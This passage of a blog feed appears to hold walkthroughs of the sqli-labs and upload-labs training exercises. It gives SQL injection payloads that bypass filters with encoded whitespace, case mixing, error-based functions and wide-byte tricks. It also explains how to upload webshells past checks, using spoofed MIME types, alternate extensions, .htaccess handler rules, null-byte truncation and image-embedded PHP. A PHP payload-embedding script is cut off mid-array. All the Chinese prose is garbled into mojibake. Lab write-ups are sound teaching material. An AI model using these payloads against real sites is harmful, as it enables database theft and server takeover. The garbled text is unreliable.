alt=&#34;sql&#34;&gt;&lt;br&gt;å°±å¯ä»¥ç”¨adminè´¦æˆ·ç™»å½•&lt;br&gt;&lt;img src=&#34;https://iminx-1258939911.cos.ap-chengdu.myqcloud.com/%E5%86%85%E5%AE%B9/Sqli-labs/12.png&#34; alt=&#34;sql&#34;&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;Less-25&#34;&gt;&lt;a href=&#34;#Less-25&#34; class=&#34;headerlink&#34; title=&#34;Less-25&#34;&gt;&lt;/a&gt;Less-25&lt;/h2&gt;&lt;p&gt;ANDå’ŒORéƒ½è¢«è¿‡æ»¤ï¼Œä½†æ˜¯UNIONæ²¡æœ‰è¢«è¿‡æ»¤å¯ä»¥å®ç°æ³¨å…¥ï¼Œå¹¶ä¸”å¯ä»¥é€šè¿‡åŒå†™æ¥Bypassè¿‡æ»¤ï¼š&lt;code&gt;id=-1&amp;#39; oorr 1=1--+&lt;/code&gt;&lt;/p&gt;
&lt;h2 id=&#34;Less-25a&#34;&gt;&lt;a href=&#34;#Less-25a&#34; class=&#34;headerlink&#34; title=&#34;Less-25a&#34;&gt;&lt;/a&gt;Less-25a&lt;/h2&gt;&lt;p&gt;å’Œ25ä¸€æ ·&lt;/p&gt;
&lt;h2 id=&#34;Less-26&#34;&gt;&lt;a href=&#34;#Less-26&#34; class=&#34;headerlink&#34; title=&#34;Less-26&#34;&gt;&lt;/a&gt;Less-26&lt;/h2&gt;&lt;p&gt;è¿‡æ»¤äº†ç©ºæ ¼ï¼Œæœ¬æƒ³ç€ç”¨&lt;code&gt;/**/&lt;/code&gt;ç»•è¿‡ï¼Œå‘ç°è¿˜æ˜¯ä¸è¡Œï¼Œä¸€çœ‹æºç ï¼š&lt;br&gt;&lt;img src=&#34;https://iminx-1258939911.cos.ap-chengdu.myqcloud.com/%E5%86%85%E5%AE%B9/Sqli-labs/13.png&#34; alt=&#34;sql&#34;&gt;&lt;br&gt;è¿‡æ»¤äº†å¤§éƒ¨åˆ†çš„ä¸œè¥¿ï¼Œæœ¬æ¥æƒ³ç€ç»•è¿‡ç©ºæ ¼çš„æ–¹å¼ï¼š&lt;br&gt;%09 TABé”®ï¼ˆæ°´å¹³ï¼‰ã€%0a æ–°å»ºä¸€è¡Œã€%0c æ–°çš„ä¸€é¡µã€%0d returnåŠŸèƒ½ã€%0b TABé”®ï¼ˆå‚ç›´ï¼‰ã€%a0 ç©ºæ ¼ï¼Œå‘ç°å…¶ä¸­%a0ä»¥åŠ%0bå¯ç”¨ï¼Œ&lt;br&gt;&lt;img src=&#34;https://iminx-1258939911.cos.ap-chengdu.myqcloud.com/%E5%86%85%E5%AE%B9/Sqli-labs/14.png&#34; alt=&#34;sql&#34;&gt;&lt;br&gt;æˆ–è€…éœ€è¦ç”¨()ç»•è¿‡ï¼Œä½¿ç”¨æŠ¥é”™æ³¨å…¥çš„æ–¹å¼ï¼Œæ„é€ payloadï¼š&lt;code&gt;?id=-1%27||extractualue(1,concat(0x7e,(select%20database()),0x7e))||%271%27=%271&lt;/code&gt;&lt;br&gt;&lt;img src=&#34;https://iminx-1258939911.cos.ap-chengdu.myqcloud.com/%E5%86%85%E5%AE%B9/Sqli-labs/15.png&#34; alt=&#34;sql&#34;&gt;&lt;br&gt;&lt;code&gt;0&amp;#39;||updatexml(1,concat(&amp;#39;$&amp;#39;,(select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema=&amp;#39;security&amp;#39;))),0)||&amp;#39;1&amp;#39;=&amp;#39;1&lt;/code&gt;çˆ†è¡¨å&lt;br&gt;&lt;img src=&#34;https://iminx-1258939911.cos.ap-chengdu.myqcloud.com/%E5%86%85%E5%AE%B9/Sqli-labs/16.png&#34; alt=&#34;sql&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;Less-26a&#34;&gt;&lt;a href=&#34;#Less-26a&#34; class=&#34;headerlink&#34; title=&#34;Less-26a&#34;&gt;&lt;/a&gt;Less-26a&lt;/h2&gt;&lt;p&gt;åŸºäºç»•è¿‡è¿‡æ»¤ç©ºæ ¼åçš„æ­£ç¡®æ³¨å…¥ï¼ˆå¯ç”¨%a0ç»•è¿‡ï¼‰ï¼Œæˆ–è€…åŸºäºboolç›²æ³¨ï¼Œå› ä¸ºæ²¡æœ‰é”™è¯¯å›æ˜¾ï¼Œæ‰€ä»¥ä¸èƒ½æŠ¥é”™æ³¨å…¥&lt;/p&gt;
&lt;h2 id=&#34;Less-27&#34;&gt;&lt;a href=&#34;#Less-27&#34; class=&#34;headerlink&#34; title=&#34;Less-27&#34;&gt;&lt;/a&gt;Less-27&lt;/h2&gt;&lt;p&gt;é¢˜ç›®è¯´è¿‡æ»¤äº†UNIONå’ŒSELECTï¼Œä½†æ˜¯æŸ¥çœ‹æºä»£ç å‘ç°å¯ä»¥å¤§å°å†™ç»•è¿‡ã€‚ã€‚ã€‚åŒæ—¶è¿‡æ»¤äº†ç©ºæ ¼å’Œæ³¨é‡Šå¤«ï¼Œå¯ä»¥ç”¨ä¸Šé¢çš„æ–¹æ³•ç»•è¿‡ï¼Œpayloadâ€œ&lt;code&gt;?id=0&amp;#39;%a0unIon%a0seleCt%a01,2,3||&amp;#39;1&amp;#39;=&amp;#39;1&lt;/code&gt;&lt;/p&gt;
&lt;h2 id=&#34;Less-27a&#34;&gt;&lt;a href=&#34;#Less-27a&#34; class=&#34;headerlink&#34; title=&#34;Less-27a&#34;&gt;&lt;/a&gt;Less-27a&lt;/h2&gt;&lt;p&gt;ç”¨&lt;code&gt;&amp;quot;&lt;/code&gt;é—­åˆï¼Œå…¶ä½™åŒä¸Š&lt;/p&gt;
&lt;h2 id=&#34;Less-28&#34;&gt;&lt;a href=&#34;#Less-28&#34; class=&#34;headerlink&#34; title=&#34;Less-28&#34;&gt;&lt;/a&gt;Less-28&lt;/h2&gt;&lt;p&gt;è™½ç„¶é¢˜ç›®è¯´è¿‡æ»¤äº†unionå’Œselectï¼Œä½†æ˜¯å‘ç°ä»ç„¶æ˜¯å¯ä»¥ç”¨çš„ï¼Œä¸çŸ¥é“æ˜¯ç¯å¢ƒé—®é¢˜è¿˜æ˜¯é¢˜ç›®æœ¬æ¥å°±æ˜¯è¿™æ ·çš„ï¼ŒåŒæ—¶æ˜¯ç”¨&lt;code&gt;(&amp;#39;&lt;/code&gt;é—­åˆçš„ï¼Œä¸”è¿‡æ»¤äº†ç©ºæ ¼ç­‰ï¼Œè¯¾ç”¨ä¸Šé¢çš„æ–¹æ³•ç»•è¿‡&lt;br&gt;payloadï¼š&lt;code&gt;?id=0&amp;#39;)%a0union%a0select%a01,2,3||(&amp;#39;1&amp;#39;=&amp;#39;1&lt;/code&gt;&lt;br&gt;åæ¥æ‰å‘ç°é¢˜ç›®æ˜¯è¿‡æ»¤äº†&lt;code&gt;union select&lt;/code&gt;è¿™ä¸ªè¯ç»„ï¼Œå› ä¸ºä¸­é—´åŠ äº†&lt;code&gt;%a0&lt;/code&gt;,åˆšå¥½ç»•è¿‡äº†æ£€æµ‹&lt;/p&gt;
&lt;h2 id=&#34;Less-28a&#34;&gt;&lt;a href=&#34;#Less-28a&#34; class=&#34;headerlink&#34; title=&#34;Less-28a&#34;&gt;&lt;/a&gt;Less-28a&lt;/h2&gt;&lt;p&gt;åŒä¸Šï¼Œä½†æ˜¯è²Œä¼¼å‡å°‘è¯¾è¿‡æ»¤çš„ä¸œè¥¿ï¼Œæ›´ç®€å•äº†ï¼Ÿï¼Ÿ&lt;/p&gt;
&lt;h2 id=&#34;Less-29&#34;&gt;&lt;a href=&#34;#Less-29&#34; class=&#34;headerlink&#34; title=&#34;Less-29&#34;&gt;&lt;/a&gt;Less-29&lt;/h2&gt;&lt;p&gt;å°è¯•ä¸€ä¸‹&lt;code&gt;?id=0%27union%20select%201,2,3--+&lt;/code&gt;,å‘ç°å¥½åƒå•¥ä¹Ÿæ²¡è¿‡æ»¤ï¼Ÿï¼Ÿï¼Ÿ&lt;br&gt;ç„¶åå°±å’Œç¬¬ä¸€å…³ä¸€æ ·äº†ã€‚ã€‚ã€‚&lt;/p&gt;
&lt;h2 id=&#34;Less-30&#34;&gt;&lt;a href=&#34;#Less-30&#34; class=&#34;headerlink&#34; title=&#34;Less-30&#34;&gt;&lt;/a&gt;Less-30&lt;/h2&gt;&lt;p&gt;å…ˆç”¨å•å¼•å·é—­åˆå‘ç°æ²¡ç”¨ï¼Œå†ç”¨åŒå¼•å·é—­åˆå‘ç°æŠ¥é”™ï¼Œæ¥ä¸‹æ¥å°±å’Œä¸Šé¢çš„ä¸€æ ·äº†&lt;/p&gt;
&lt;h2 id=&#34;Less-31&#34;&gt;&lt;a href=&#34;#Less-31&#34; class=&#34;headerlink&#34; title=&#34;Less-31&#34;&gt;&lt;/a&gt;Less-31&lt;/h2&gt;&lt;p&gt;ç”¨&lt;code&gt;&amp;quot;)&lt;/code&gt;é—­åˆï¼Œå…¶ä½™ä¸€æ ·&lt;/p&gt;
&lt;h2 id=&#34;Less-32&#34;&gt;&lt;a href=&#34;#Less-32&#34; class=&#34;headerlink&#34; title=&#34;Less-32&#34;&gt;&lt;/a&gt;Less-32&lt;/h2&gt;&lt;p&gt;å®½å­—èŠ‚æ³¨å…¥ï¼Œpayloadï¼š&lt;code&gt;?id=0%df%27%20union%20select%201,2,3--+&lt;/code&gt;&lt;/p&gt;
&lt;h2 id=&#34;Less-33&#34;&gt;&lt;a href=&#34;#Less-33&#34; class=&#34;headerlink&#34; title=&#34;Less-33&#34;&gt;&lt;/a&gt;Less-33&lt;/h2&gt;&lt;p&gt;åŒä¸Š&lt;/p&gt;
&lt;h2 id=&#34;Less-34&#34;&gt;&lt;a href=&#34;#Less-34&#34; class=&#34;headerlink&#34; title=&#34;Less-34&#34;&gt;&lt;/a&gt;Less-34&lt;/h2&gt;&lt;p&gt;è¿™é‡Œçš„æäº¤æ–¹å¼æ˜¯postï¼Œä½†æ˜¯åˆç”¨/è½¬ä¹‰äº†â€™ï¼Œä¸€ç§æ–¹å¼æ˜¯å°†utf-8è½¬æ¢ä¸ºutf-16æˆ– utf-32ï¼Œä¾‹å¦‚å°† â€˜ è½¬ä¸ºutf-16ä¸ºï¿½â€™ ï¼Œä½†æ˜¯è¿™%dfä»ç„¶å¯ä»¥ç”¨&lt;br&gt;ï¼Œå†åŠ ä¸ŠæŠ¥é”™æ³¨å…¥ï¼š&lt;br&gt;&lt;img src=&#34;https://iminx-1258939911.cos.ap-chengdu.myqcloud.com/%E5%86%85%E5%AE%B9/Sqli-labs/17.png&#34; alt=&#34;sql&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;Less-35&#34;&gt;&lt;a href=&#34;#Less-35&#34; class=&#34;headerlink&#34; title=&#34;Less-35&#34;&gt;&lt;/a&gt;Less-35&lt;/h2&gt;&lt;p&gt;ç›´æ¥æ³¨ã€‚ã€‚ã€‚&lt;/p&gt;
&lt;h2 id=&#34;Less-36&#34;&gt;&lt;a href=&#34;#Less-36&#34; class=&#34;headerlink&#34; title=&#34;Less-36&#34;&gt;&lt;/a&gt;Less-36&lt;/h2&gt;&lt;p&gt;%dfå®½å­—èŠ‚æ³¨å…¥&lt;/p&gt;
&lt;h2 id=&#34;Less-37&#34;&gt;&lt;a href=&#34;#Less-37&#34; class=&#34;headerlink&#34; title=&#34;Less-37&#34;&gt;&lt;/a&gt;Less-37&lt;/h2&gt;&lt;p&gt;è¿™ä¸€æ¬¡å°±æ²¡æœ‰åƒ34å…³ä¸€æ ·ç®€å•ï¼Œ%dfæ²¡æœ‰åŠæ³•ç”¨äº†ï¼Œä½†æ˜¯å¯ä»¥å°†utf-8è½¬æ¢ä¸ºutf-16æˆ– utf-32ï¼Œæ„é€ payloadâ€œ&lt;code&gt;111ï¿½&amp;#39; union select 1,(select database())--+&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://iminx-1258939911.cos.ap-chengdu.myqcloud.com/%E5%86%85%E5%AE%B9/Sqli-labs/18.png&#34; alt=&#34;sql&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;Less-38&#34;&gt;&lt;a href=&#34;#Less-38&#34; class=&#34;headerlink&#34; title=&#34;Less-38&#34;&gt;&lt;/a&gt;Less-38&lt;/h2&gt;&lt;p&gt;ç›´æ¥æ³¨ã€‚ã€‚ã€‚&lt;/p&gt;
</content>
        <updated>2019-10-12T02:48:24.000Z</updated>
    </entry>
    <entry>
        <id>http://blog.m1n.me/2019/10/12/upload-labs/</id>
        <title>upload-labs</title>
        <link rel="alternate" href="http://blog.m1n.me/2019/10/12/upload-labs/"/>
        <content type="html">&lt;p&gt;emmmm&lt;/p&gt;
&lt;span id=&#34;more&#34;&gt;&lt;/span&gt;
&lt;h1 id=&#34;Less-1&#34;&gt;&lt;a href=&#34;#Less-1&#34; class=&#34;headerlink&#34; title=&#34;Less-1&#34;&gt;&lt;/a&gt;Less-1&lt;/h1&gt;&lt;ol&gt;
&lt;li&gt;å‰ç«¯éªŒè¯ï¼Œå…ˆå°†ä¸€å¥è¯æ”¹æˆjpgï¼Œé€šè¿‡å‰ç«¯éªŒè¯åæŠ“åŒ…ä¿®æ”¹åç¼€åä¸ºphpä»¥åŠä¿®æ”¹content-typeï¼šapplication/octet-streamæˆåŠŸä¸Šä¼ &lt;/li&gt;
&lt;li&gt;ç¦ç”¨JSç›´æ¥ä¸Šä¼ &lt;/li&gt;
&lt;/ol&gt;
&lt;h1 id=&#34;Less-2&#34;&gt;&lt;a href=&#34;#Less-2&#34; class=&#34;headerlink&#34; title=&#34;Less-2&#34;&gt;&lt;/a&gt;Less-2&lt;/h1&gt;&lt;p&gt;è¿™ä¸€å…³æ£€æµ‹çš„æ˜¯Content-Type: image/jpegï¼ŒæŠ“åŒ…ä¿®æ”¹ä¸€ä¸‹å°±ok&lt;/p&gt;
&lt;h1 id=&#34;Less-3&#34;&gt;&lt;a href=&#34;#Less-3&#34; class=&#34;headerlink&#34; title=&#34;Less-3&#34;&gt;&lt;/a&gt;Less-3&lt;/h1&gt;&lt;p&gt;é»‘åå•ç»•è¿‡ï¼Œå¯ä»¥ä¸Šä¼ .phtmlç­‰æ–‡ä»¶ç»•è¿‡ï¼Œphpè§£é‡Šå™¨å¯ä»¥å°†phptã€php3ã€4ã€5ã€phtmlè§£ææˆPHPæ–‡ä»¶ï¼Œä¸èƒ½è§£æçš„åç¼€ä¼šä»¥txtå½¢å¼å±•ç°ï¼Œä½†æ˜¯å…¶ä¸­åŒ…å«çš„htmlä»£ç ä¼šè¢«æµè§ˆå™¨è§£æï¼Œå¯ä»¥æ‰§è¡ŒJSä»£ç &lt;/p&gt;
&lt;h1 id=&#34;Less-4&#34;&gt;&lt;a href=&#34;#Less-4&#34; class=&#34;headerlink&#34; title=&#34;Less-4&#34;&gt;&lt;/a&gt;Less-4&lt;/h1&gt;&lt;p&gt;å…ˆä¸Šä¼ ä¸€ä¸ªtest.phpxæ–‡ä»¶ï¼Œå†ä¸Šä¼ .htaccessæ–‡ä»¶ä½¿å¾—å®ƒèƒ½å¤Ÿè¢«è§£ææ¥ç»•è¿‡.htaccesså†…å®¹ï¼š&lt;/p&gt;
&lt;figure class=&#34;highlight apache&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs apache&#34;&gt;&lt;span class=&#34;hljs-section&#34;&gt;&amp;lt;FilesMatch &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;test.phpx&amp;quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;br&gt;  &lt;span class=&#34;hljs-attribute&#34;&gt;&lt;span class=&#34;hljs-nomarkup&#34;&gt;SetHandler&lt;/span&gt;&lt;/span&gt; application/x-httpd-php&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-section&#34;&gt;&amp;lt;/FilesMatch&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;æˆ–è€…ï¼š&lt;/p&gt;
&lt;figure class=&#34;highlight applescript&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs applescript&#34;&gt;AddType &lt;span class=&#34;hljs-built_in&#34;&gt;application&lt;/span&gt;/x-httpd-php .jpg&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;æ¥ä½¿å¾—jpgèƒ½è¢«è§£æ&lt;/p&gt;
&lt;h1 id=&#34;Less-5&#34;&gt;&lt;a href=&#34;#Less-5&#34; class=&#34;headerlink&#34; title=&#34;Less-5&#34;&gt;&lt;/a&gt;Less-5&lt;/h1&gt;&lt;p&gt;å¤§å°å†™ç»•è¿‡ã€‚ã€‚ã€‚ã€‚&lt;/p&gt;
&lt;h1 id=&#34;Less-6&#34;&gt;&lt;a href=&#34;#Less-6&#34; class=&#34;headerlink&#34; title=&#34;Less-6&#34;&gt;&lt;/a&gt;Less-6&lt;/h1&gt;&lt;p&gt;æ–‡ä»¶åç»“å°¾åŠ ç©ºæ ¼ç»•è¿‡é»‘åå•&lt;/p&gt;
&lt;h1 id=&#34;Less-7&#34;&gt;&lt;a href=&#34;#Less-7&#34; class=&#34;headerlink&#34; title=&#34;Less-7&#34;&gt;&lt;/a&gt;Less-7&lt;/h1&gt;&lt;p&gt;æ–‡ä»¶ç»“å°¾åŠ â€œ.â€å¯ä»¥è¢«è§£æ&lt;/p&gt;
&lt;h1 id=&#34;Less-8&#34;&gt;&lt;a href=&#34;#Less-8&#34; class=&#34;headerlink&#34; title=&#34;Less-8&#34;&gt;&lt;/a&gt;Less-8&lt;/h1&gt;&lt;p&gt;æ–‡ä»¶ç»“å°¾åŠ â€œ::$DATAâ€,Windowsç‰¹æ€§&lt;/p&gt;
&lt;h1 id=&#34;Less-9&#34;&gt;&lt;a href=&#34;#Less-9&#34; class=&#34;headerlink&#34; title=&#34;Less-9&#34;&gt;&lt;/a&gt;Less-9&lt;/h1&gt;&lt;p&gt;æ–‡ä»¶ç»“å°¾åŠ â€œ.ç©ºæ ¼.â€ï¼Œæœ€åä¼šå˜æˆâ€.php.â€Windowsç‰¹æ€§&lt;/p&gt;
&lt;h1 id=&#34;Less-10&#34;&gt;&lt;a href=&#34;#Less-10&#34; class=&#34;headerlink&#34; title=&#34;Less-10&#34;&gt;&lt;/a&gt;Less-10&lt;/h1&gt;&lt;p&gt;ä¸Šä¼ phtmlhpç»•è¿‡&lt;/p&gt;
&lt;h1 id=&#34;Less-11&#34;&gt;&lt;a href=&#34;#Less-11&#34; class=&#34;headerlink&#34; title=&#34;Less-11&#34;&gt;&lt;/a&gt;Less-11&lt;/h1&gt;&lt;p&gt;ä¸Šä¼ è·¯å¾„ä¿®æ”¹æˆ../upload/1.php%00,%00æˆªæ–­ã€‚æˆ–è€…å°è¯•1.php/. &lt;/p&gt;
&lt;h1 id=&#34;Less-12&#34;&gt;&lt;a href=&#34;#Less-12&#34; class=&#34;headerlink&#34; title=&#34;Less-12&#34;&gt;&lt;/a&gt;Less-12&lt;/h1&gt;&lt;p&gt;ä¸Šä¼ è·¯å¾„ä¿®æ”¹æˆ../upload/1.php+ï¼Œç„¶åç”¨16è¿›åˆ¶æŸ¥çœ‹ï¼Œæ‰¾åˆ°68  70   2bï¼ŒæŠŠ2bä¿®æ”¹æˆ00ç„¶åä¸Šä¼ &lt;/p&gt;
&lt;h1 id=&#34;Less-13&#34;&gt;&lt;a href=&#34;#Less-13&#34; class=&#34;headerlink&#34; title=&#34;Less-13&#34;&gt;&lt;/a&gt;Less-13&lt;/h1&gt;&lt;p&gt;è¦æ±‚ä¸Šä¼ ä¸‰ç§æ ¼å¼çš„å›¾ç‰‡é©¬ï¼Œç„¶åç”¨æ–‡ä»¶åŒ…å«æ¼æ´æ‰§è¡Œã€‚jpgæ ¼å¼å¯ä»¥ç›´æ¥ç”¨CMDå‘½ä»¤&lt;code&gt;copy test.jpg/b test.php/a ma.jpg&lt;/code&gt;ç”Ÿæˆï¼ŒGIFå’ŒPNGæ ¼å¼å¯ä»¥é€šè¿‡Hxdä¿®æ”¹æ­£å¸¸å›¾ç‰‡ç”Ÿæˆï¼Œ&lt;/p&gt;
&lt;p&gt;å…¶ä¸­JPGæ ¼å¼å¤´éƒ¨&lt;code&gt;FF D8 (FF E0)&lt;/code&gt;å°¾éƒ¨&lt;code&gt;FF D9&lt;/code&gt;PNGæ ¼å¼å¤´éƒ¨&lt;code&gt;89 50 4E 47 0D 0A 1A 0A&lt;/code&gt;GIFæ ¼å¼å¤´éƒ¨&lt;code&gt;47 49 46 38 39 61&lt;/code&gt;&lt;/p&gt;
&lt;h1 id=&#34;Less-14&#34;&gt;&lt;a href=&#34;#Less-14&#34; class=&#34;headerlink&#34; title=&#34;Less-14&#34;&gt;&lt;/a&gt;Less-14&lt;/h1&gt;&lt;p&gt;æç¤ºç”¨getimagesize()è·å–å›¾ç‰‡ä¿¡æ¯ï¼ŒåŒæ ·ä¸Šä¼ å›¾ç‰‡é©¬å³å¯ç»•è¿‡&lt;/p&gt;
&lt;h1 id=&#34;Less-15&#34;&gt;&lt;a href=&#34;#Less-15&#34; class=&#34;headerlink&#34; title=&#34;Less-15&#34;&gt;&lt;/a&gt;Less-15&lt;/h1&gt;&lt;p&gt;æç¤ºæœ¬passä½¿ç”¨exif_imagetype()æ£€æŸ¥æ˜¯å¦ä¸ºå›¾ç‰‡æ–‡ä»¶ï¼ï¼Œç»•è¿‡æ–¹æ³•åŒä¸Š&lt;/p&gt;
&lt;h1 id=&#34;Less-16&#34;&gt;&lt;a href=&#34;#Less-16&#34; class=&#34;headerlink&#34; title=&#34;Less-16&#34;&gt;&lt;/a&gt;Less-16&lt;/h1&gt;&lt;p&gt;æç¤ºè¿›è¡Œäº†äºŒæ¬¡æ¸²æŸ“ï¼Œå°è±¡ä¸­æ˜¯æŸä¸€ä¸ªåŒºå—äºŒæ¬¡æ¸²æŸ“æ—¶ä¸ä¼šè¢«æ”¹å˜ï¼ŒGIFæ ¼å¼åŠ åœ¨å°¾éƒ¨çš„ä»£ç ä¼šè¢«åˆ é™¤ï¼Œæˆ‘æ‰¾åˆ°äº†ä¸­é—´ç©ºç™½éƒ¨åˆ†ï¼ŒåŠ ä¸Šphpinfoåå°±å¯ä»¥æ‰§è¡Œã€‚&lt;/p&gt;
&lt;p&gt;PNGè¿˜æœ‰JPGæ ¼å¼çš„å¤„ç†æ–¹æ³•æ¯”è¾ƒéº»çƒ¦ï¼Œç”¨ç½‘ä¸Šçš„è„šæœ¬æ¥ç”Ÿæˆ&lt;/p&gt;
&lt;p&gt;PNG:&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs php&#34;&gt;&lt;br&gt;&lt;span class=&#34;hljs-meta&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$p&lt;/span&gt; = &lt;span class=&#34;hljs-keyword&#34;&gt;array&lt;/span&gt;(&lt;span class=&#34;hljs-number&#34;&gt;0xa3&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0x9f&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0x67&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0xf7&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0x0e&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0x93&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0x1b&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0x23&lt;/span&gt;,&lt;br&gt;           &lt;span class=&#34;hljs-number&#34;&gt;0xbe&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0x2c&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0x8a&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0xd0&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0x80&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0xf9&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0xe1&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0xae&lt;/span&gt;,&lt;br&gt;           &lt;span class=&#34;hljs-number&#34;&gt;0x22&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0xf6&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0xd9&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0x43&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0x5d&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0xfb&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0xae&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0xcc&lt;/span&gt;,&lt;br&gt;           &lt;span class=&#34;hljs-number&#34;&gt;0x5a&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0x01&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0xdc&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0x5a&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0x01&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0xdc&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0xa3&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0x9f&lt;/span&gt;,&lt;br&gt;           &lt;span class=&#34;hljs-number&#34;&gt;0x67&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0xa5&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0xbe&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0x5f&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0x76&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0x74&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0x5a&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0x4c&lt;/span&gt;,&lt;br&gt;           &lt;span class=&#34;hljs-number&#34;&gt;0xa1&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0x3f&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0x7a&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0xbf&lt;/span&gt;, &lt;span 